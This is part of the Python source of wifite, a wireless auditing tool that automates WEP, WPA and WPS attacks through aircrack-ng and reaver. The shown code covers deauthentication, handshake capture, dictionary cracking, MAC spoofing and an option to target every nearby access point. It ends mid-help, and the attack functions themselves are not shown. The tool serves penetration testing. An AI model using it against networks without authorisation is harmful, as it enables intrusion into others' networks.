#!/usr/bin/python

# -*- coding: utf-8 -*-

"""
	wifite
	
	author: derv82 at gmail
	
	Licensed under the GNU General Public License Version 2 (GNU GPL v2), 
	    available at: http://www.gnu.org/licenses/gpl-2.0.txt
	
	(C) 2011 Derv Merkler

	-----------------

	TODO:
	
	ignore root check when -cracked (afterward) (need root for -check?)
	"cracked*" in list of AP's
	
	Restore same command-line switch names from v1
	
	If device already in monitor mode, check for and, if applicable, use macchanger
	
	 WPS
	 * Mention reaver automatically resumes sessions
	 * Warning about length of time required for WPS attack (*hours*)
	 * Show time since last successful attempt
	 * Percentage of tries/attempts ?
	 * Update code to work with reaver 1.4 ("x" sec/att)

	 WEP:
	 * ability to pause/skip/continue	(done, not tested) 
	 * Option to capture only IVS packets (uses --output-format ivs,csv)
	   - not compatible on older aircrack-ng's.
		   - Just run "airodump-ng --output-format ivs,csv", "No interface specified" = works
		 - would cut down on size of saved .caps
	 
	 reaver:
	 	 MONITOR ACTIVITY!
	 	 - Enter ESSID when executing (?)
	   - Ensure WPS key attempts have begun. 
	   - If no attempts can be made, stop attack
	   
	   - During attack, if no attempts are made within X minutes, stop attack & Print
	   
	   - Reaver's output when unable to associate:
	     [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
	   - If failed to associate for x minutes, stop attack (same as no attempts?)
	
	MIGHTDO:
	  * WPA - crack (pyrit/cowpatty) (not really important)
	  * Test injection at startup? (skippable via command-line switch)
	 
"""

#############
# LIBRARIES #
#############

import os     # File management
import time   # Measuring attack intervals
import random # Generating a random MAC address.
import errno  # Error numbers

from sys import argv          # Command-line arguments
from sys import stdout, stdin # Flushing

from shutil import copy # Copying .cap files

# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM

import re # RegEx, Converting SSID to filename

import urllib # Check for new versions from the repo


################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

REVISION = 85;


# WPA variables
WPA_DISABLE          = False # Flag to skip WPA handshake capture
WPA_STRIP_HANDSHAKE  = True  # Use pyrit or tshark (if applicable) to strip handshake
WPA_DEAUTH_COUNT     = 5     # Count to send deauthentication packets
WPA_DEAUTH_TIMEOUT   = 10    # Time to wait between deauthentication bursts (in seconds)
WPA_ATTACK_TIMEOUT   = 500   # Total time to allow for a handshake attack (in seconds)
WPA_HANDSHAKE_DIR    = 'hs'  # Directory in which handshakes .cap files are stored
# Strip file path separator if needed
if WPA_HANDSHAKE_DIR != '' and WPA_HANDSHAKE_DIR[-1] == os.sep: 
	WPA_HANDSHAKE_DIR = WPA_HANDSHAKE_DIR[:-1]

WPA_FINDINGS         = []    # List of strings containing info on successful WPA attacks
WPA_DONT_CRACK       = False # Flag to skip cracking of handshakes
WPA_DICTIONARY       = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
if not os.path.exists(WPA_DICTIONARY): WPA_DICTIONARY = ''

# Various programs to use when checking for a four-way handshake.
# True means the program must find a valid handshake in order for wifite to recognize a handshake.
# Not finding handshake short circuits result (ALL 'True' programs must find handshake)
WPA_HANDSHAKE_TSHARK   = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)
WPA_HANDSHAKE_PYRIT    = False # Sometimes crashes on incomplete dumps, but accurate.
WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
WPA_HANDSHAKE_COWPATTY = False # Uses more lenient "nonstrict mode" (-2)



# WEP variables
WEP_DISABLE         = False # Flag for ignoring WEP networks
WEP_PPS             = 600   # packets per second (Tx rate)
WEP_TIMEOUT         = 600   # Amount of time to give each attack
WEP_ARP_REPLAY      = True  # Various WEP-based attacks via aireplay-ng
WEP_CHOPCHOP        = True  #
WEP_FRAGMENT        = True  #
WEP_CAFFELATTE      = True  #
WEP_P0841           = True
WEP_HIRTE           = True
WEP_CRACK_AT_IVS    = 10000 # Number of IVS at which we start cracking
WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
WEP_FINDINGS        = []    # List of strings containing info on successful WEP attacks.
WEP_SAVE            = False # Save packets.

# WPS variables
WPS_DISABLE         = False # Flag to skip WPS scan and attacks
WPS_FINDINGS        = []    # List of (successful) results of WPS attacks
WPS_TIMEOUT         = 660   # Time to wait (in seconds) for successful PIN attempt
WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
WPS_MAX_RETRIES     = 0     # Number of times to re-try the same pin before giving up completely.


# Program variables
WIRELESS_IFACE     = ''    # User-defined interface
TARGET_CHANNEL     = 0     # User-defined channel to scan on
TARGET_ESSID       = ''    # User-defined ESSID of specific target to attack
TARGET_BSSID       = ''    # User-defined BSSID of specific target to attack
IFACE_TO_TAKE_DOWN = ''    # Interface that wifite puts into monitor mode
                           # It's our job to put it out of monitor mode after the attacks
ORIGINAL_IFACE_MAC = ('', '') # Original interface name[0] and MAC address[1] (before spoofing)
DO_NOT_CHANGE_MAC  = True  # Flag for disabling MAC anonymizer
TARGETS_REMAINING  = 0     # Number of access points remaining to attack
WPA_CAPS_TO_CRACK  = []    # list of .cap files to crack (full of CapFile objects)
THIS_MAC           = ''    # The interfaces current MAC address.
SHOW_MAC_IN_SCAN   = False # Display MACs of the SSIDs in the list of targets
CRACKED_TARGETS    = []    # List of targets we have already cracked
ATTACK_ALL_TARGETS = False # Flag for when we want to attack *everyone*
ATTACK_MIN_POWER   = 0     # Minimum power (dB) for access point to be considered a target
VERBOSE_APS        = True  # Print access points as they appear

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray


if os.getuid() != 0:
	print R+' [!]'+O+' ERROR:'+G+' wifite'+O+' must be run as '+R+'root'+W
	print R+' [!]'+O+' login as root ('+W+'su root'+O+') or try '+W+'sudo ./wifite.py'+W
	exit(1)

if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]: # OSX support, 'cause why not?
	print O+' [!]'+R+' WARNING:'+G+' wifite'+W+' must be run on '+O+'linux'+W
	exit(1)


# Create temporary directory to work in
from tempfile import mkdtemp
temp = mkdtemp(prefix='wifite')
if not temp.endswith(os.sep):
	temp += os.sep

# /dev/null, send output from programs so they don't print to screen.
DN = open(os.devnull, 'w')
ERRLOG = open('./error.log', 'w')
OUTLOG = open('./out.log', 'w')

###################
# DATA STRUCTURES #
###################

class CapFile:
	"""
		Holds data about an access point's .cap file, including AP's ESSID & BSSID.
	"""
	def __init__(self, filename, ssid, bssid):
		self.filename = filename
		self.ssid = ssid
		self.bssid = bssid

class Target:
	"""
		Holds data for a Target (aka Access Point aka Router)
	"""
	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data  = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
		self.wps = False # Default to non-WPS-enabled router.
		self.key = ''

class Client:
	"""
		Holds data for a Client (device connected to Access Point/Router)
	"""
	def __init__(self, bssid, station, power):
		self.bssid   = bssid
		self.station = station
		self.power   = power









##################
# MAIN FUNCTIONS #
##################


def main():
	"""
		Where the magic happens.
	"""
	global TARGETS_REMAINING, THIS_MAC, CRACKED_TARGETS
	
	CRACKED_TARGETS = load_cracked() # Load previously-cracked APs from file

	handle_args() # Parse args from command line, set global variables.
	
	initial_check() # Ensure required programs are installed.
	
	# The "get_iface" method anonymizes the MAC address (if needed)
	# and puts the interface into monitor mode.
	iface = get_iface()
	
	THIS_MAC = get_mac_address(iface) # Store current MAC address
	
	(targets, clients) = scan(iface=iface, channel=TARGET_CHANNEL)
	
	try:
		index = 0
		skipall = False
		while index < len(targets):
			target = targets[index]
			# Check if we have already cracked this target
			for already in CRACKED_TARGETS:
				if already.bssid == targets[index].bssid:
					print R+'\n [!]'+O+' you have already cracked this access point\'s key!'+W
					print R+' [!] %s' % (C+already.ssid+W+': "'+G+already.key+W+'"')
					ri = raw_input(GR+' [+] '+W+'do you want to crack this access point again? ('+G+'y/'+O+'n'+W+'): ')
					if ri.lower() == 'n':
						targets.pop(index)
						index -= 1
					break

			# Check if handshakes already exist, ask user whether to skip targets or save new handshakes
			handshake_file = WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
			                 + '_' + target.bssid.replace(':', '-') + '.cap'
			if os.path.exists(handshake_file):
				print R+'\n [!] '+O+'you already have a handshake file for %s:' % (C+target.ssid+W)
				print '        %s\n' % (G+handshake_file+W)
				if not skipall:
					print GR+' [+]'+W+' do you want to '+G+'[s]kip'+W+', '+B+'skip [a]ll'+W+', '+O+'[c]apture again'+W+', or '+R+'[o]verwrite'+W+'?'
					ri = 'x'
					while ri != 's' and ri != 'c' and ri != 'o' and ri != 'a': 
						ri = raw_input(GR+' [+] '+W+'enter '+G+'s'+W+', '+B+'a'+W+', '+O+'c,'+W+' or '+R+'o'+W+': '+G).lower()
					print W+"\b",
					if ri == 'a':
						skipall = True
						targets.pop(index)
						index -= 1
					elif ri == 's': 
						targets.pop(index)
						index -= 1
					elif ri == 'o': 
						remove_file(handshake_file)
						continue
				else:
					targets.pop(index)
					index -= 1
					print R+'        skipping...'+W

			index += 1

	except KeyboardInterrupt:
		print '\n '+R+'(^C)'+O+' interrupted\n'
		exit_gracefully(0)
	
	wpa_success = 0
	wep_success = 0
	wpa_total   = 0
	wep_total   = 0
	
	TARGETS_REMAINING = len(targets)
	for t in targets:
		TARGETS_REMAINING -= 1
		
		# Build list of clients connected to target
		ts_clients = []
		for c in clients:
			if c.station == t.bssid:
				ts_clients.append(c)
		
		print ''
		if t.encryption.find('WPA') != -1:
			need_handshake = True
			if not WPS_DISABLE and t.wps:
				need_handshake = not wps_attack(iface, t)
				wpa_total += 1
			
			if not need_handshake: wpa_success += 1
			if TARGETS_REMAINING < 0: break
			
			if not WPA_DISABLE and need_handshake:
				wpa_total += 1
				if wpa_get_handshake(iface, t, ts_clients):
					wpa_success += 1
			
		elif t.encryption.find('WEP') != -1:
			wep_total += 1
			if attack_wep(iface, t, ts_clients):
				wep_success += 1
		
		else: print R+' unknown encryption:',t.encryption,W
		
		# If user wants to stop attacking
		if TARGETS_REMAINING <= 0: break
	
	if wpa_total + wep_total > 0:
		# Attacks are done! Show results to user
		print ''
		print GR+' [+] %s%d attack%s completed:%s' % (G, wpa_total + wep_total, '' if wpa_total+wep_total == 1 else 's', W)
		print ''
		if wpa_total > 0:
			if wpa_success == 0:           print GR+' [+]'+R,
			elif wpa_success == wpa_total: print GR+' [+]'+G,
			else:                          print GR+' [+]'+O,
			print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)
		
			for finding in WPA_FINDINGS:
				print '        ' + C+finding+W
		
		if wep_total > 0:
			if wep_success == 0:           print GR+' [+]'+R,
			elif wep_success == wep_total: print GR+' [+]'+G,
			else:                          print GR+' [+]'+O,
			print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)
		
			for finding in WEP_FINDINGS:
				print '        ' + C+finding+W
		
		caps = len(WPA_CAPS_TO_CRACK)
		if caps > 0 and not WPA_DONT_CRACK:
			print GR+' [+]'+W+' starting '+G+'WPA cracker'+W+' on %s%d handshake%s' % (G, caps, W if caps == 1 else 's'+W)
			for cap in WPA_CAPS_TO_CRACK:
				wpa_crack(cap)
	
	print ''
	exit_gracefully(0)

def rename(old, new):
	"""
		Renames file 'old' to 'new', works with separate partitions.
		Thanks to hannan.sadar
	"""
	try:
		os.rename(old, new)
	except os.error, detail:
		if detail.errno == errno.EXDEV:
			try:
				copy(old, new)
			except:
				os.unlink(new)
				raise
				os.unlink(old)
		# if desired, deal with other errors
		else:
			raise


def initial_check():
	"""
		Ensures required programs are installed.
	"""
	global WPS_DISABLE
	airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
	for air in airs:
		if program_exists(air): continue
		print R+' [!]'+O+' required program not found: %s' % (R+air+W)
		print R+' [!]'+O+' this program is bundled with the aircrack-ng suite:'+W
		print R+' [!]'+O+'        '+C+'http://www.aircrack-ng.org/'+W
		print R+' [!]'+O+' or: '+W+'sudo apt-get install aircrack-ng\n'+W
		exit_gracefully(1)
	
	if not program_exists('iw'):
		print R+' [!]'+O+' airmon-ng requires the program %s\n' % (R+'iw'+W)
		exit_gracefully(1)
	
	printed = False
	# Check reaver
	if not program_exists('reaver'):
		printed = True
		print R+' [!]'+O+' the program '+R+'reaver'+O+' is required for WPS attacks'+W
		print R+'    '+O+'   available at '+C+'http://code.google.com/p/reaver-wps'+W
		WPS_DISABLE = True
	elif not program_exists('walsh') and not program_exists('wash'):
		printed = True
		print R+' [!]'+O+' reaver\'s scanning tool '+R+'walsh'+O+' (or '+R+'wash'+O+') was not found'+W
		print R+' [!]'+O+' please re-install reaver or install walsh/wash separately'+W

	# Check handshake-checking apps
	recs = ['tshark', 'pyrit', 'cowpatty']
	for rec in recs:
		if program_exists(rec): continue
		printed = True
		print R+' [!]'+O+' the program %s is not required, but is recommended%s' % (R+rec+O, W)
	if printed: print ''	


def handle_args():
	"""
		Handles command-line arguments, sets global variables.
	"""
	global WIRELESS_IFACE, TARGET_CHANNEL, DO_NOT_CHANGE_MAC, TARGET_ESSID, TARGET_BSSID
	global WPA_DISABLE, WPA_STRIP_HANDSHAKE, WPA_DEAUTH_COUNT, WPA_DEAUTH_TIMEOUT, WPA_ATTACK_TIMEOUT
	global WPA_DONT_CRACK, WPA_DICTIONARY, WPA_HANDSHAKE_TSHARK, WPA_HANDSHAKE_PYRIT
	global WPA_HANDSHAKE_AIRCRACK, WPA_HANDSHAKE_COWPATTY
	global WEP_DISABLE, WEP_PPS, WEP_TIMEOUT, WEP_ARP_REPLAY, WEP_CHOPCHOP, WEP_FRAGMENT
	global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
	global WEP_SAVE, SHOW_MAC_IN_SCAN, ATTACK_ALL_TARGETS, ATTACK_MIN_POWER
	global WPS_DISABLE, WPS_TIMEOUT, WPS_RATIO_THRESHOLD, WPS_MAX_RETRIES
	global VERBOSE_APS

	args = argv[1:]
	if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
		help()
		exit_gracefully(0)
	
	set_encrypt = False
	set_hscheck = False
	set_wep     = False
	capfile     = ''  # Filename of .cap file to analyze for handshakes
	
	try:
		for i in xrange(0, len(args)):

			if not set_encrypt and (args[i] == '-wpa' or args[i] == '-wep' or args[i] == '-wps'):
				WPS_DISABLE = True
				WPA_DISABLE = True
				WEP_DISABLE = True
				set_encrypt = True
			if   args[i] == '-wpa': 
				print GR+' [+]'+W+' targeting '+G+'WPA'+W+' encrypted networks (use '+G+'-wps'+W+' for WPS scan)'
				WPA_DISABLE = False
			elif args[i] == '-wep': 
				print GR+' [+]'+W+' targeting '+G+'WEP'+W+' encrypted networks'
				WEP_DISABLE = False
			elif args[i] == '-wps': 
				print GR+' [+]'+W+' targeting '+G+'WPS-enabled'+W+' networks'
				WPS_DISABLE = False
			
			elif args[i] == '-c':
				i += 1
				try: TARGET_CHANNEL = int(args[i])
				except ValueError: print O+' [!]'+R+' invalid channel: '+O+args[i]+W
				except IndexError: print O+' [!]'+R+' no channel given!'+W
				else: print GR+' [+]'+W+' channel set to %s' % (G+args[i]+W)
			elif args[i] == '-mac':
				print GR+' [+]'+W+' mac address anonymizing '+G+'enabled'+W
				print O+'     note: only works if device is not already in monitor mode!'+W
				DO_NOT_CHANGE_MAC = False
			elif args[i] == '-i':
				i += 1
				WIRELESS_IFACE = args[i]
				print GR+' [+]'+W+' set interface: %s' % (G+args[i]+W)
			elif args[i] == '-e':
				i += 1
				try: TARGET_ESSID = args[i]
				except ValueError: print R+' [!]'+O+' no ESSID given!'+W
				else: print GR+' [+]'+W+' targeting ESSID "%s"' % (G+args[i]+W)
			elif args[i] == '-b':
				i += 1
				try: TARGET_BSSID = args[i]
				except ValueError: print R+' [!]'+O+' no BSSID given!'+W
				else: print GR+' [+]'+W+' targeting BSSID "%s"' % (G+args[i]+W)
			elif args[i] == '-showb' or args[i] == '-showbssid':
				SHOW_MAC_IN_SCAN = True
				print GR+' [+]'+W+' target MAC address viewing '+G+'enabled'+W
			elif args[i] == '-all' or args[i] == '-hax0ritna0':
				print GR+' [+]'+W+' targeting '+G+'all access points'+W
				ATTACK_ALL_TARGETS = True
			elif args[i] == '-pow' or args[i] == '-power':
				i += 1
				try:
					ATTACK_MIN_POWER = int(args[i])
				except ValueError: print R+' [!]'+O+' invalid power level: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no power level given!'+W
				else: print GR+' [+]'+W+' minimum target power set to %s' % (G+args[i] + "dB"+W)
			elif args[i] == '-q' or args[i] == '-quiet':
				VERBOSE_APS = False
				print GR+' [+]'+W+' list of APs during scan '+O+'disabled'+W

			elif args[i] == '-check':
				i += 1
				try: capfile = args[i]
				except IndexError:
					print R+' [!]'+O+' unable to analyze capture file'+W 
					print R+' [!]'+O+' no cap file given!\n'+W
					exit_gracefully(1)
				else: 
					if not os.path.exists(capfile): 
						print R+' [!]'+O+' unable to analyze capture file!'+W
						print R+' [!]'+O+' file not found: '+R+capfile+'\n'+W
						exit_gracefully(1)
				'''
			TODO Uncomment for release
			elif args[i] == '-upgrade' or args[i] == '-update':
				upgrade()
				exit(0)
				'''
			
			elif args[i] == '-cracked':
				if len(CRACKED_TARGETS) == 0:
					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
					exit_gracefully(1)
				print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
				for victim in CRACKED_TARGETS:
					print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
				print ''
				exit_gracefully(0)
					

			# WPA
			if not set_hscheck and (args[i] == '-tshark' or args[i] == '-cowpatty' or args[i] == '-aircrack' or args[i] == 'pyrit'):
				WPA_HANDSHAKE_TSHARK   = False
				WPA_HANDSHAKE_PYRIT    = False
				WPA_HANDSHAKE_COWPATTY = False
				WPA_HANDSHAKE_AIRCRACK = False
				set_hscheck = True
			elif args[i] == '-strip':
				WPA_STRIP_HANDSHAKE = True
				print GR+' [+]'+W+' handshake stripping '+G+'enabled'+W
			elif args[i] == '-wpadt':
				i += 1
				WPA_DEAUTH_TIMEOUT = int(args[i])
				print GR+' [+]'+W+' WPA deauth timeout set to %s' % (G+args[i]+' seconds'+W)
			elif args[i] == '-wpac':
				i += 1
				WPA_DEAUTH_COUNT = int(args[i])
				print GR+' [+]'+W+' WPA deauth count set to %s' % (G+args[i]+' packets'+W)
			elif args[i] == '-wpat':
				i += 1
				WPA_ATTACK_TIMEOUT = int(args[i])
				print GR+' [+]'+W+' WPA attack timeout set to %s' % (G+args[i]+' seconds'+W)
			elif args[i] == '-crack':
				WPA_DONT_CRACK = False
				print GR+' [+]'+W+' WPA cracking '+G+'enabled'+W
			elif args[i] == '-dict':
				i += 1
				try:
					WPA_DICTIONARY = args[i]
				except IndexError: print R+' [!]'+O+' no WPA dictionary given!'
				else:
					if os.path.exists(args[i]):
						print GR+' [+]'+W+' WPA dictionary set to %s' % (G+args[i]+W)
					else:
						print R+' [!]'+O+' WPA dictionary file not found: %s' % (args[i])
			if args[i] == '-tshark':
				WPA_HANDSHAKE_TSHARK = True
				print GR+' [+]'+W+' tshark handshake verification '+G+'enabled'+W
			if args[i] == '-pyrit':
				WPA_HANDSHAKE_PYRIT = True
				print GR+' [+]'+W+' pyrit handshake verification '+G+'enabled'+W
			if args[i] == '-aircrack':
				WPA_HANDSHAKE_AIRCRACK = True
				print GR+' [+]'+W+' aircrack handshake verification '+G+'enabled'+W
			if args[i] == '-cowpatty':
				WPA_HANDSHAKE_COWPATTY = True
				print GR+' [+]'+W+' cowpatty handshake verification '+G+'enabled'+W

			# WEP
			if not set_wep and args[i] == '-chopchop' or args[i] == 'fragment' or \
			                   args[i] == 'caffelatte' or args[i] == '-arpreplay' or \
			                   args[i] == '-p0841' or args[i] == '-hirte':
				WEP_CHOPCHOP   = False
				WEP_ARPREPLAY  = False
				WEP_CAFFELATTE = False
				WEP_FRAGMENT   = False
				WEP_P0841      = False
				WEP_HIRTE      = False
			if args[i] == '-chopchop': 
				print GR+' [+]'+W+' WEP chop-chop attack '+G+'enabled'+W
				WEP_CHOPCHOP = True
			if args[i] == '-fragment' or args[i] == '-frag' or args[i] == '-fragmentation':
				print GR+' [+]'+W+' WEP fragmentation attack '+G+'enabled'+W
				WEP_FRAGMENT = True
			if args[i] == '-caffelatte': 
				print GR+' [+]'+W+' WEP caffe-latte attack '+G+'enabled'+W
				WEP_CAFFELATTE = True
			if args[i] == '-arpreplay': 
				print GR+' [+]'+W+' WEP arp-replay attack '+G+'enabled'+W
				WEP_ARPREPLAY = True
			if args[i] == '-p0841': 
				print GR+' [+]'+W+' WEP p0841 attack '+G+'enabled'+W
				WEP_P0841 = True
			if args[i] == '-hirte': 
				print GR+' [+]'+W+' WEP hirte attack '+G+'enabled'+W
				WEP_HIRTE = True
			if args[i] == '-nofake': 
				print GR+' [+]'+W+' ignoring failed fake-authentication '+R+'disabled'+W
				WEP_IGNORE_FAKEAUTH = False
			if args[i] == '-wept' or args[i] == '-weptime':
				i += 1
				try:
					WEP_TIMEOUT = int(args[i])
				except ValueError: print R+' [!]'+O+' invalid timeout: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no timeout given!'+W
				else: print GR+' [+]'+W+' WEP attack timeout set to %s' % (G+args[i] + " seconds"+W)
			if args[i] == '-pps':
				i += 1
				try:
					WEP_PPS = int(args[i])
				except ValueError: print R+' [!]'+O+' invalid value: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no value given!'+W
				else: print GR+' [+]'+W+' packets-per-second rate set to %s' % (G+args[i] + " packets/sec"+W)
			if args[i] == '-save' or args[i] == '-wepsave':
				WEP_SAVE = True
				print GR+' [+]'+W+' WEP .cap file saving '+G+'enabled'+W


			# WPS
			if args[i] == '-wpst' or args[i] == '-wpstime':
				i += 1
				try:
					WPS_TIMEOUT = int(args[i])
				except ValueError: print R+' [!]'+O+' invalid timeout: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no timeout given!'+W
				else: print GR+' [+]'+W+' WPS attack timeout set to %s' % (G+args[i] + " seconds"+W)
			if args[i] == '-wpsratio' or args[i] == 'wpsr':
				i += 1
				try:
					WPS_RATIO_THRESHOLD = float(args[i])
				except ValueError: print R+' [!]'+O+' invalid percentage: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no ratio given!'+W
				else: print GR+' [+]'+W+' minimum WPS tries/attempts threshold set to %s' % (G+args[i] + ""+W)
			if args[i] == '-wpsmaxr' or args[i] == '-wpsretry':
				i += 1
				try:
					WPS_MAX_RETRIES = int(args[i])
				except ValueError: print R+' [!]'+O+' invalid number: %s' % (R+args[i]+W)
				except IndexError: print R+' [!]'+O+' no number given!'+W
				else: print GR+' [+]'+W+' WPS maximum retries set to %s' % (G+args[i] + " retries"+W)
				
	except IndexError:
		print '\nindexerror\n\n'
	
	if capfile != '':
		analyze_capfile(capfile)
	print ''

def banner():
	""" 
		Displays ASCII art of the highest caliber.
	"""
	global REVISION
	print ''
	print G+"  .;'                     `;,    "
	print G+" .;'  ,;'             `;,  `;,   "+W+"WiFite v2 (r" + str(REVISION) + "mod)"
	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"automated wireless auditor"
	print G+"':.  ':.  ':. "+GR+"/_\\"+G+" ,:'  ,:'  ,:'  "
	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"designed for Linux"
	print G+"  ':.       "+GR+"/_____\\"+G+"      ,:'     "
	print G+"           "+GR+"/       \\"+G+"             "
	print W	

"""
TODO Uncomment for release
def upgrade():
	'''
		Checks for new version, prompts to upgrade, then
		replaces this script with the latest from the repo
	'''
	global REVISION
	REVISION = 83
	try:
		print GR+' [!]'+W+' upgrading requires an '+G+'internet connection'+W
		print GR+' [+]'+W+' checking for latest version...'
		(revision, description, date_changed) = get_revision()
		if revision == -1:
			print R+' [!]'+O+' unable to access googlecode'+W
		elif revision > REVISION:
			print GR+' [!]'+W+' a new version is '+G+'available!'+W
			print GR+' [-]'+W+'   revision:    '+G+str(revision)+W
			print GR+' [-]'+W+'   description: '+G+description+W
			print GR+' [-]'+W+'   date added:  '+G+date_changed+W
			response = raw_input(GR+' [+]'+W+' do you want to upgrade to the latest version? (y/n): ')
			if not response.lower().startswith('y'):
				print GR+' [-]'+W+' upgrading '+O+'aborted'+W
				exit_gracefully(0)
				return
			# Download script, replace with this one
			print GR+' [+] '+G+'downloading'+W+' update...'
			try:
				sock = urllib.urlopen('http://wifite.googlecode.com/svn/trunk/wifite.py')
				page = sock.read()
			except IOError:
				page = ''
			if page == '':
				print R+' [+] '+O+'unable to download latest version'+W
				exit_gracefully(1)
			
			# Create/save the new script
			f=open('wifite_new.py','w')
			f.write(page)
			f.close()
			
			# The filename of the running script
			this_file = __file__
			if this_file.startswith('./'):
				this_file = this_file[2:]
			
			# create/save a shell script that replaces this script with the new one
			f = open('update_wifite.sh','w')
			f.write('''#!/bin/sh\n
			           rm -f ''' + this_file + '''\n
			           mv wifite_new.py ''' + this_file + '''\n
			           rm -f update_wifite.sh\n
			           chmod +x ''' + this_file + '''\n
			          ''')
			f.close()
			
			# Change permissions on the script
			returncode = call(['chmod','+x','update_wifite.sh'])
			if returncode != 0:
				print R+' [!]'+O+' permission change returned unexpected code: '+str(returncode)+W
				exit_gracefully(1)
			# Run the script
			returncode = call(['sh','update_wifite.sh'])
			if returncode != 0:
				print R+' [!]'+O+' upgrade script returned unexpected code: '+str(returncode)+W
				exit_gracefully(1)
			
			print GR+' [+] '+G+'updated!'+W+' type "./' + this_file + '" to run again'
			
		else:
			print GR+' [-]'+W+' your copy of wifite is '+G+'up to date'+W
			
	except KeyboardInterrupt:
		print R+'\n (^C)'+O+' wifite upgrade interrupted'+W
	exit_gracefully(0)

def get_revision():
	'''
		Gets latest revision # from google code repository
		Returns tuple: revision#, description of change, date changed
	'''
	irev  =-1
	desc =''
	since=''
	
	try:
		sock = urllib.urlopen('http://code.google.com/p/wifite/source/list?path=/trunk/wifite.py')
		page = sock.read()
	except IOError:
		return (-1, '', '')
	
	# get the revision
	start= page.find('href="detail?r=')
	stop = page.find('&amp;', start)
	if start != -1 and stop != -1:
		start += 15
		rev=page[start:stop]
		try:
			irev=int(rev)
		except ValueError:
			rev=rev.split('\n')[0]
			print R+'[+] invalid revision number: "'+rev+'"'
	
	# get the description
	start= page.find(' href="detail?r='+str(irev)+'', start + 3)
	start= page.find('">',start)
	stop = page.find('</a>', start)
	if start != -1 and stop != -1:
		start += 2
		desc=page[start:stop].strip()
		desc=desc.replace("&#39;","'")
		desc=desc.replace("&lt;","<")
		desc=desc.replace("&gt;",">")
		if '\n' in desc:
			desc = desc.split('\n')[0]
	
	# get the time last modified
	start= page.find(' href="detail?r='+str(irev)+'', start + 3)
	start= page.find('">',start)
	stop = page.find('</a>', start)
	if start != -1 and stop != -1:
		start += 2
		since=page[start:stop]
	
	return (irev, desc, since)
"""


def help():
	"""
		Prints help screen
	"""
	
	head    = W
	sw      = G
	var     = GR
	des     = W
	de      = G
	
	print head+'   COMMANDS'+W
	print sw+'\t-check '+var+'<file>\t'+des+'check capfile '+var+'<file>'+des+' for handshakes.'+W
	print sw+'\t-cracked    \t'+des+'display previously-cracked access points'+W
	print ''

	print head+'   GLOBAL'+W
	print sw+'\t-all         \t'+des+'attack all targets.              '+de+'[off]'+W
	print sw+'\t-i '+var+'<iface>  \t'+des+'wireless interface for capturing '+de+'[auto]'+W
	print sw+'\t-mac         \t'+des+'anonymize mac address            '+de+'[off]'+W
	print sw+'\t-c '+var+'<channel>\t'+des+'channel to scan for targets      '+de+'[auto]'+W
	print sw+'\t-e '+var+'<essid>  \t'+des+'target a specific access point by ssid (name)  '+de+'[ask]'+W
	print sw+'\t-b '+var+'<bssid>  \t'+des+'target a specific access point by bssid (mac)  '+de+'[auto]'+W
	print sw+'\t-showb       \t'+des+'display target BSSIDs after scan               '+de+'[off]'+W
	print sw+'\t-pow '+var+'<db>   \t'+des+'attacks any targets with signal strenghth > '+var+'db '+de+'[0]'+W
	print sw+'\t-quiet       \t'+des+'do not print list of APs during scan           '+de+'[off]'+W
	print ''
	
	print head+'\n   WPA'+W
	print sw+'\t-wpa        \t'+des+'only target WPA networks (works with -wps -wep)   '+de+'[off]'+W
	print sw+'\t-wpat '+var+'<sec>   \t'+des+'time to wait for WPA attack to complete (seconds) '+de+'[500]'+W
	print sw+'\t-wpadt '+var+'<sec>  \t'+des+'time to wait between sending deauth packets (sec) '+de+'[10]'+W
	print sw+'\t-wpac '+var+'<count>  \t'+des+'count sending deauth packets '+de+'[5]'+W
	print sw+'\t-strip      \t'+des+'strip handshake using tshark or pyrit             '+de+'[off]'+W
	print sw+'\t-crack '+var+'<dic>\t'+des+'crack WPA handshakes using '+var+'<dic>'+des+' wordlist file    '+de+'[off]'+W
	print sw+'\t-dict '+var+'<file>\t'+des+'specify dictionary to use when cracking WPA '+de+'[phpbb.txt]'+W
	print sw+'\t-aircrack   \t'+des+'verify handshake using aircrack '+de+'[on]'+W
	print sw+'\t-pyrit      \t'+des+'verify handshake using pyrit    '+de+'[off]'+W
	print sw+'\t-tshark     \t'+des+'verify handshake using tshark   '+de+'[on]'+W
